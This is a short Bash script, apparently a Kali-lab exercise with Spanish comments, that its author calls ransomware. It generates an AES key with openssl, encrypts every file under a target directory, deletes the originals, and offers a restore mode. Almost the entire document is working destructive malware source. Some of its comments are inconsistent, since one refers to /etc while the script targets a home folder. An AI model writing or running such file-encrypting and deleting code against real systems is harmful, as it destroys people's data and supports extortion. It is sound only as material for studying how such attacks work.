#!/bin/bash
#Author: SergioZ3R0
#Randosmware que cifra todo los archivos no criticos del sistema y los borra.
# Generals/randosmware.sh

# Variables
DIR="/home/kali/paquito"                   # Directorio a encriptar
KEY="key.txt"                # Nombre del archivo de texto con la clave

# Funciones

# Genera la clave
function generateKey(){
    echo "Generando clave..."
    openssl rand -base64 32 > "$HOME/$KEY"
    echo "Clave generada"
}

# Encripta los archivos

function encrypt(){
    echo "Encriptando..."
    # Utiliza find para buscar archivos y directorios en /etc excluyendo /etc/passwd, /etc/shadow, /etc/sudoers y /etc/hosts
    find "$DIR" -mindepth 1 \( -type f ! -name passwd ! -name shadow ! -name sudoers ! -name hosts -o -type d \) -print0 | while IFS= read -r -d '' file; do
        openssl enc -aes-256-cbc -salt -in "$file" -out "$file.enc" -kfile "$HOME/$KEY" # Encripta el archivo
        rm "$file"                                    # Elimina el archivo original
    done
    echo "Encriptado y archivos originales eliminados"
}

# Restaura los archivos desde los archivos encriptados
function restore(){
    echo "Restaurando backup..."
    find "$DIR" -mindepth 1 \( -type f ! -name passwd ! -name shadow ! -name sudoers ! -name hosts -o -type d \) -print0 | while IFS= read -r -d '' file; do
        openssl enc -aes-256-cbc -d -in "$file" -out "${file%.enc}" -kfile "$HOME/$KEY" # Desencripta el archivo
        rm "$file"                                    # Elimina el archivo encriptado
    done
    echo "Backup restaurado"
}

# Muestra la ayuda
function help(){
    echo "Uso: $0 [opciones]"
    echo "Opciones:"
    echo "  -h, --help      Muestra la ayuda"
    echo "  -g, --generate  Genera la clave"
    echo "  -e, --encrypt   Encripta los archivos"
    echo "  -r, --restore   Restaura los archivos"
}

# Main
case $1 in
    -h|--help)
        help
        ;;
    -g|--generate)
        generateKey
        ;;
    -e|--encrypt)
        encrypt
        ;;
    -r|--restore)
        restore
        ;;
    *)
        echo "Opción no válida"
        help
        ;;
esac

## 3.2.2. Ransomware
